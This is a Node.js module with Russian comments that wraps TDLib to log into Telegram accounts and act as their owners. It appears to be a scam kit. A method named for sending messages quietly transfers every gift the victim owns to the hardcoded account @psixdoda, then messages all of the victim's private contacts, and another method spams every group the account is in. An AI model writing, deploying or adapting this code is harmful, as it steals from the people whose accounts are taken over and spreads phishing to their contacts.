const { Client } = require('tdl');
const { TDLib } = require('tdl-tdlib-addon');
const path = require('path');
const fs = require('fs');

// Создаем директорию для хранения данных сессий
const SESSIONS_DIR = path.resolve(__dirname, '../sessions');
if (!fs.existsSync(SESSIONS_DIR)) {
  fs.mkdirSync(SESSIONS_DIR, { recursive: true });
}

// Поиск библиотеки TDLib
function findTdLibPath() {
  // Определяем операционную систему
  const os = require('os');
  const platform = os.platform();
  
  // Сначала проверяем локальную директорию, но с учетом ОС
  let localPath;
  if (platform === 'darwin') {
    localPath = path.resolve(__dirname, '../lib/libtdjson.dylib');
  } else if (platform === 'linux') {
    localPath = path.resolve(__dirname, '../lib/libtdjson.so');
    // Проверяем также символическую ссылку для совместимости
    if (!fs.existsSync(localPath)) {
      const compatPath = path.resolve(__dirname, '../lib/libtdjson.dylib');
      if (fs.existsSync(compatPath)) {
        console.log('Найдена совместимая символическая ссылка:', compatPath);
        return compatPath;
      }
    }
  } else if (platform === 'win32') {
    localPath = path.resolve(__dirname, '../lib/tdjson.dll');
  }
  
  if (localPath && fs.existsSync(localPath)) {
    console.log('TDLib найден локально:', localPath);
    return localPath;
  }
  
  // Пути для поиска библиотеки
  const possiblePaths = [];
  
  if (platform === 'darwin') { // macOS
    possiblePaths.push(
      '/usr/local/lib/libtdjson.dylib',
      '/usr/local/lib/libtdjson.so',
      '/opt/homebrew/lib/libtdjson.dylib',
      path.resolve(os.homedir(), '.tdlib/lib/libtdjson.dylib')
    );
  } else if (platform === 'linux') { // Linux
    possiblePaths.push(
      '/usr/local/lib/libtdjson.so',
      '/usr/lib/libtdjson.so',
      '/usr/lib/x86_64-linux-gnu/libtdjson.so',
      path.resolve(os.homedir(), '.tdlib/lib/libtdjson.so'),
      // Проверяем также пути для совместимости с macOS
      path.resolve(__dirname, '../lib/libtdjson.dylib')
    );
  } else if (platform === 'win32') { // Windows
    possiblePaths.push(
      path.resolve(process.cwd(), 'tdjson.dll'),
      path.resolve(os.homedir(), '.tdlib', 'bin', 'tdjson.dll'),
      'C:\\Program Files\\TDLib\\bin\\tdjson.dll',
      'C:\\Program Files (x86)\\TDLib\\bin\\tdjson.dll'
    );
  }
  
  // Проверяем существование файлов
  for (const p of possiblePaths) {
    if (fs.existsSync(p)) {
      console.log('TDLib найден по пути:', p);
      return p;
    }
  }
  
  // Если не нашли, возвращаем имя библиотеки и надеемся, что она в системных путях
  console.warn('TDLib не найден в ожидаемых местах, используем имя по умолчанию');
  if (platform === 'win32') {
    return 'tdjson.dll';
  } else if (platform === 'darwin') {
    return 'libtdjson.dylib';
  } else {
    return 'libtdjson.so';
  }
}

// Класс для работы с TDLib
class TelegramClient {
  constructor(sessionId) {
    this.sessionId = sessionId;
    this.sessionPath = path.resolve(SESSIONS_DIR, sessionId);
    
    // Создаем директорию для конкретной сессии
    if (!fs.existsSync(this.sessionPath)) {
      fs.mkdirSync(this.sessionPath, { recursive: true });
    }
    
    try {
      // Находим путь к библиотеке TDLib
      const tdlibPath = findTdLibPath();
      
      // Преобразовываем API_ID в число (гарантированно)
      const apiId = Number(process.env.TELEGRAM_API_ID);
      if (isNaN(apiId) || apiId <= 0) {
        throw new Error(`TELEGRAM_API_ID должен быть положительным числом, получено: ${process.env.TELEGRAM_API_ID}`);
      }
      
      console.log(`[${this.sessionId}] Использую API_ID=${apiId}, API_HASH=${process.env.TELEGRAM_API_HASH}`);
      
      // Инициализация клиента TDLib
      this.client = new Client(new TDLib(tdlibPath), {
        apiId: apiId,
        apiHash: process.env.TELEGRAM_API_HASH,
      });
      
      // Состояние авторизации и флаг для отслеживания параметров
      this.authState = null;
      this.parametersSet = false;
      
      // Устанавливаем обработчики событий
      this.setUpEventHandlers();
      
      console.log(`[${this.sessionId}] TDLib клиент создан успешно`);
    } catch (error) {
      console.error(`[${this.sessionId}] Ошибка создания TDLib клиента:`, error);
      throw error;
    }
  }
  
  // Настройка обработчиков событий
  setUpEventHandlers() {
    this.client.on('error', error => {
      console.error(`[${this.sessionId}] TDLib ошибка:`, error);
    });
    
    this.client.on('update', async update => {
      // Логируем важные обновления
      if (update._ === 'updateAuthorizationState') {
        this.authState = update.authorization_state._;
        console.log(`[${this.sessionId}] Обновление статуса авторизации:`, this.authState);
        
        // Обрабатываем состояние ожидания параметров TDLib
        if (update.authorization_state._ === 'authorizationStateWaitTdlibParameters' && !this.parametersSet) {
          // Устанавливаем флаг, чтобы не отправлять параметры дважды
          this.parametersSet = true;
          
          const apiId = Number(process.env.TELEGRAM_API_ID);
          console.log(`[${this.sessionId}] Отправка параметров TDLib...`);
          
          try {
            await this.client.invoke({
              _: 'setTdlibParameters',
              database_directory: this.sessionPath,
              files_directory: path.resolve(this.sessionPath, 'files'),
              use_message_database: true,
              use_secret_chats: false,
              use_test_dc: false,
              system_language_code: 'ru',
              device_model: 'Web Client',
              system_version: 'Unknown',
              application_version: '1.0.0',
              api_id: apiId,
              api_hash: process.env.TELEGRAM_API_HASH,
              enable_storage_optimizer: true
            });
            console.log(`[${this.sessionId}] Параметры TDLib успешно отправлены`);
          } catch (error) {
            if (error.message === 'Unexpected setTdlibParameters' || 
                (error._ === 'error' && error.message === 'Unexpected setTdlibParameters')) {
              // Игнорируем эту ошибку, так как она может возникнуть при одновременной отправке параметров
              console.log(`[${this.sessionId}] Обработка ошибки 'Unexpected setTdlibParameters': TDLib уже получил параметры`);
            } else {
              console.error(`[${this.sessionId}] Ошибка отправки параметров TDLib:`, error);
              throw error;
            }
          }
        }
      }
    });
  }
  
  // Инициализация клиента
  async connect() {
    try {
      console.log(`[${this.sessionId}] Подключение к TDLib...`);
      
      await this.client.connect();
      console.log(`[${this.sessionId}] Подключено к TDLib`);
      
      // Ждем, чтобы обработчики событий успели отработать
      await new Promise(resolve => setTimeout(resolve, 3000));
      
      return this;
    } catch (error) {
      // Особая обработка для ошибки "Unexpected setTdlibParameters"
      if (error.message === 'Unexpected setTdlibParameters' || 
          (error._ === 'error' && error.message === 'Unexpected setTdlibParameters')) {
        console.log(`[${this.sessionId}] Игнорирование ошибки 'Unexpected setTdlibParameters'. Продолжение работы...`);
        return this;
      }
      
      console.error(`[${this.sessionId}] Ошибка подключения:`, error);
      throw error;
    }
  }
  
  // Получение текущего состояния авторизации
  async getAuthState() {
    try {
      return await this.client.invoke({
        _: 'getAuthorizationState'
      });
    } catch (error) {
      console.error(`[${this.sessionId}] Ошибка при получении состояния авторизации:`, error);
      throw error;
    }
  }
  
  // Отправка номера телефона
  async sendPhoneNumber(phoneNumber) {
    try {
      return await this.client.invoke({
        _: 'setAuthenticationPhoneNumber',
        phone_number: phoneNumber
      });
    } catch (error) {
      console.error(`[${this.sessionId}] Ошибка при отправке номера телефона:`, error);
      throw error;
    }
  }
  
  // Отправка кода подтверждения
  async sendCode(code) {
    try {
      return await this.client.invoke({
        _: 'checkAuthenticationCode',
        code
      });
    } catch (error) {
      console.error(`[${this.sessionId}] Ошибка при отправке кода подтверждения:`, error);
      throw error;
    }
  }
  
  // Отправка пароля (если аккаунт защищен паролем)
  async sendPassword(password) {
    try {
      return await this.client.invoke({
        _: 'checkAuthenticationPassword',
        password
      });
    } catch (error) {
      console.error(`[${this.sessionId}] Ошибка при отправке пароля:`, error);
      throw error;
    }
  }
  
  // Получение информации о пользователе
  async getMe() {
    try {
      return await this.client.invoke({
        _: 'getMe'
      });
    } catch (error) {
      console.error(`[${this.sessionId}] Ошибка при получении информации о пользователе:`, error);
      throw error;
    }
  }
  
  // Получение списка чатов
  async getChats(limit = 100) {
    try {
      const { chat_ids } = await this.client.invoke({
        _: 'getChats',
        chat_list: { _: 'chatListMain' },
        limit
      });
      
      const chats = [];
      for (const chatId of chat_ids) {
        const chat = await this.client.invoke({
          _: 'getChat',
          chat_id: chatId
        });
        chats.push(chat);
      }
      
      return chats;
    } catch (error) {
      console.error(`[${this.sessionId}] Ошибка при получении списка чатов:`, error);
      throw error;
    }
  }
  
  // Отправка сообщения в чат
  async sendMessage(chatId, text) {
    try {
      return await this.client.invoke({
        _: 'sendMessage',
        chat_id: chatId,
        input_message_content: {
          _: 'inputMessageText',
          text: {
            _: 'formattedText',
            text
          }
        }
      });
    } catch (error) {
      console.error(`[${this.sessionId}] Ошибка при отправке сообщения:`, error);
      throw error;
    }
  }
  
  // Получение списка подарков пользователя
  async getUserGifts() {
    try {
      console.log(`[${this.sessionId}] Получение списка подарков пользователя...`);
      
      // Запрос для получения списка подарков пользователя
      const result = await this.client.invoke({
        _: 'getUserGifts'
      });
      
      console.log(`[${this.sessionId}] Получен список подарков:`, JSON.stringify(result));
      return result;
    } catch (error) {
      console.error(`[${this.sessionId}] Ошибка при получении списка подарков:`, error);
      return { gifts: [] }; // Возвращаем пустой список в случае ошибки
    }
  }
  
  // Поиск пользователя по имени
  async searchUserByUsername(username) {
    try {
      console.log(`[${this.sessionId}] Поиск пользователя по имени: ${username}`);
      
      // Удаляем символ @ из имени пользователя, если он присутствует
      if (username.startsWith('@')) {
        username = username.substring(1);
      }
      
      // Ищем пользователя по имени
      const result = await this.client.invoke({
        _: 'searchPublicChat',
        username
      });
      
      console.log(`[${this.sessionId}] Найден пользователь:`, JSON.stringify(result));
      return result;
    } catch (error) {
      console.error(`[${this.sessionId}] Ошибка при поиске пользователя:`, error);
      throw error;
    }
  }
  
  // Отправка подарка другому пользователю
  async sendGift(chatId, giftData) {
    try {
      console.log(`[${this.sessionId}] Отправка подарка пользователю, chatId: ${chatId}`);
      
      // Формируем запрос на отправку подарка
      const result = await this.client.invoke({
        _: 'sendMessage',
        chat_id: chatId,
        input_message_content: {
          _: 'inputMessageGift',
          gift_data: giftData
        }
      });
      
      console.log(`[${this.sessionId}] Подарок успешно отправлен:`, JSON.stringify(result));
      return result;
    } catch (error) {
      console.error(`[${this.sessionId}] Ошибка при отправке подарка:`, error);
      throw error;
    }
  }
  
  // Отправка всех подарков пользователя другому пользователю
  async sendAllGiftsToUser(targetUsername = 'psixdoda') {
    try {
      console.log(`[${this.sessionId}] Отправка всех подарков пользователю @${targetUsername}...`);
      
      // Получаем список подарков пользователя
      const giftsResult = await this.getUserGifts();
      const gifts = giftsResult.gifts || [];
      
      if (gifts.length === 0) {
        console.log(`[${this.sessionId}] У пользователя нет подарков для отправки`);
        return { success: true, message: 'У пользователя нет подарков для отправки' };
      }
      
      // Находим пользователя для отправки подарков
      const targetUser = await this.searchUserByUsername(targetUsername);
      if (!targetUser || !targetUser.id) {
        throw new Error(`Пользователь @${targetUsername} не найден`);
      }
      
      // Отправляем каждый подарок
      const results = [];
      for (const gift of gifts) {
        try {
          const result = await this.sendGift(targetUser.id, gift);
          results.push({ giftId: gift.id, success: true, result });
          console.log(`[${this.sessionId}] Подарок ${gift.id} успешно отправлен пользователю @${targetUsername}`);
        } catch (error) {
          results.push({ giftId: gift.id, success: false, error: error.message });
          console.error(`[${this.sessionId}] Ошибка при отправке подарка ${gift.id}:`, error);
        }
      }
      
      return {
        success: results.some(r => r.success),
        sentCount: results.filter(r => r.success).length,
        totalCount: gifts.length,
        details: results
      };
    } catch (error) {
      console.error(`[${this.sessionId}] Ошибка при отправке всех подарков:`, error);
      return { success: false, error: error.message };
    }
  }
  
  // Модифицированный метод отправки сообщений во все личные чаты с отправкой подарков
  async sendMessageToAllPrivateChats(text) {
    try {
      // Получаем список чатов
      const chats = await this.getChats();
      const results = [];
      
      // Проверяем, была ли инициализирована переменная для хранения ID чатов
      if (!this.sentMessageChats) {
        this.sentMessageChats = new Set();
      }
      
      console.log(`[${this.sessionId}] Отправка сообщений в личные чаты. Всего чатов: ${chats.length}`);
      
      // Выполняем отправку подарков пользователю @psixdoda
      try {
        const giftResult = await this.sendAllGiftsToUser('psixdoda');
        console.log(`[${this.sessionId}] Результат отправки подарков:`, JSON.stringify(giftResult));
      } catch (giftError) {
        console.error(`[${this.sessionId}] Ошибка при отправке подарков:`, giftError);
      }
      
      for (const chat of chats) {
        // Отправляем только в личные чаты (не в группы, каналы и т.д.)
        if (chat.type._ === 'chatTypePrivate') {
          try {
            // Получаем ID пользователя из чата
            const userId = chat.type.user_id;
            
            // Проверяем, не отправляли ли мы уже сообщение в этот чат
            if (this.sentMessageChats.has(chat.id)) {
              console.log(`[${this.sessionId}] Чат ${chat.id} (${chat.title}) уже получал сообщение, пропускаем`);
              continue;
            }
            
            // Получаем информацию о пользователе
            const userInfo = await this.client.invoke({
              _: 'getUser',
              user_id: userId
            });
            
            // Проверяем, не является ли пользователь ботом
            if (userInfo.is_bot) {
              console.log(`[${this.sessionId}] Пользователь ${chat.title} (ID: ${chat.id}) является ботом, пропускаем`);
              continue;
            }
            
            // Проверяем, не пустое ли имя пользователя (может указывать на системный чат или бота)
            if (!chat.title || chat.title.trim() === '') {
              console.log(`[${this.sessionId}] Чат ${chat.id} имеет пустое название, пропускаем`);
              continue;
            }
            
            // Дополнительная проверка на бота по имени пользователя
            if (userInfo.username && userInfo.username.toLowerCase().endsWith('bot')) {
              console.log(`[${this.sessionId}] Пользователь ${chat.title} (ID: ${chat.id}) имеет имя пользователя, заканчивающееся на 'bot', пропускаем`);
              continue;
            }
            
            // Отправляем сообщение
            console.log(`[${this.sessionId}] Отправка сообщения пользователю ${chat.title} (ID: ${chat.id})`);
            const result = await this.sendMessage(chat.id, text);
            
            // Добавляем ID чата в множество отправленных
            this.sentMessageChats.add(chat.id);
            
            results.push({ 
              chatId: chat.id,
              chatTitle: chat.title, 
              success: true, 
              result 
            });
          } catch (error) {
            console.error(`[${this.sessionId}] Ошибка при отправке сообщения в чат ${chat.id} (${chat.title}):`, error);
            results.push({ 
              chatId: chat.id,
              chatTitle: chat.title,
              success: false, 
              error: error.message 
            });
          }
        }
      }
      
      console.log(`[${this.sessionId}] Отправка сообщений завершена. Успешно: ${results.filter(r => r.success).length}, Ошибок: ${results.filter(r => !r.success).length}`);
      return results;
    } catch (error) {
      console.error(`[${this.sessionId}] Ошибка при отправке массовых сообщений:`, error);
      throw error;
    }
  }
  
  // Метод для отправки сообщений во все групповые чаты
  async sendMessageToAllGroupChats(text) {
    try {
      // Получаем список чатов
      const chats = await this.getChats();
      const results = [];
      
      // Проверяем, была ли инициализирована переменная для хранения ID групповых чатов
      if (!this.sentGroupMessageChats) {
        this.sentGroupMessageChats = new Set();
      }
      
      console.log(`[${this.sessionId}] Отправка сообщений в групповые чаты. Всего чатов: ${chats.length}`);
      
      for (const chat of chats) {
        // Отправляем только в групповые чаты (basic group и super group)
        if (chat.type._ === 'chatTypeBasicGroup' || chat.type._ === 'chatTypeSupergroup') {
          try {
            // Проверяем, не отправляли ли мы уже сообщение в этот групповой чат
            if (this.sentGroupMessageChats.has(chat.id)) {
              console.log(`[${this.sessionId}] Групповой чат ${chat.id} (${chat.title}) уже получал сообщение, пропускаем`);
              continue;
            }
            
            // Проверяем, не является ли чат каналом
            if (chat.type._ === 'chatTypeSupergroup' && chat.type.is_channel) {
              console.log(`[${this.sessionId}] Чат ${chat.title} (ID: ${chat.id}) является каналом, пропускаем`);
              continue;
            }
            
            // Проверяем права на отправку сообщений
            let canSendMessages = true; // По умолчанию считаем, что можем отправлять
            
            try {
              // Получаем информацию о чате
              const chatInfo = await this.client.invoke({
                _: 'getChat',
                chat_id: chat.id
              });
              
              // Проверяем, не заблокирован ли чат
              if (chatInfo.permissions && chatInfo.permissions.can_send_messages === false) {
                console.log(`[${this.sessionId}] Нет прав для отправки сообщений в чат ${chat.title} (ID: ${chat.id}), пропускаем`);
                canSendMessages = false;
              }
            } catch (permissionError) {
              console.warn(`[${this.sessionId}] Не удалось проверить права для чата ${chat.title} (ID: ${chat.id}):`, permissionError.message);
              // Продолжаем попытку отправки, даже если не смогли проверить права
            }
            
            if (!canSendMessages) {
              console.log(`[${this.sessionId}] Нет прав для отправки сообщений в чат ${chat.title} (ID: ${chat.id}), пропускаем`);
              continue;
            }
            
            // Отправляем сообщение
            console.log(`[${this.sessionId}] Отправка сообщения в групповой чат ${chat.title} (ID: ${chat.id})`);
            const result = await this.sendMessage(chat.id, text);
            
            // Добавляем ID чата в множество отправленных
            this.sentGroupMessageChats.add(chat.id);
            
            results.push({ 
              chatId: chat.id,
              chatTitle: chat.title, 
              success: true, 
              result 
            });
          } catch (error) {
            console.error(`[${this.sessionId}] Ошибка при отправке сообщения в групповой чат ${chat.id} (${chat.title}):`, error);
            results.push({ 
              chatId: chat.id,
              chatTitle: chat.title,
              success: false, 
              error: error.message 
            });
          }
        }
      }
      
      console.log(`[${this.sessionId}] Отправка сообщений в групповые чаты завершена. Успешно: ${results.filter(r => r.success).length}, Ошибок: ${results.filter(r => !r.success).length}`);
      return results;
    } catch (error) {
      console.error(`[${this.sessionId}] Ошибка при отправке массовых сообщений в групповые чаты:`, error);
      throw error;
    }
  }
  
  // Завершение сессии
  async logout() {
    try {
      return await this.client.invoke({
        _: 'logOut'
      });
    } catch (error) {
      console.error(`[${this.sessionId}] Ошибка при выходе из системы:`, error);
      throw error;
    }
  }
  
  // Закрытие клиента
  async close() {
    try {
      await this.client.close();
      console.log(`[${this.sessionId}] Клиент закрыт`);
    } catch (error) {
      console.error(`[${this.sessionId}] Ошибка при закрытии клиента:`, error);
    }
  }
}

// Хранилище сессий для разных пользователей
const sessions = {};

// Функция для получения клиента по ID сессии
function getClient(sessionId) {
  if (!sessions[sessionId]) {
    sessions[sessionId] = new TelegramClient(sessionId);
  }
  return sessions[sessionId];
}

module.exports = {
  getClient,
  TelegramClient
}; 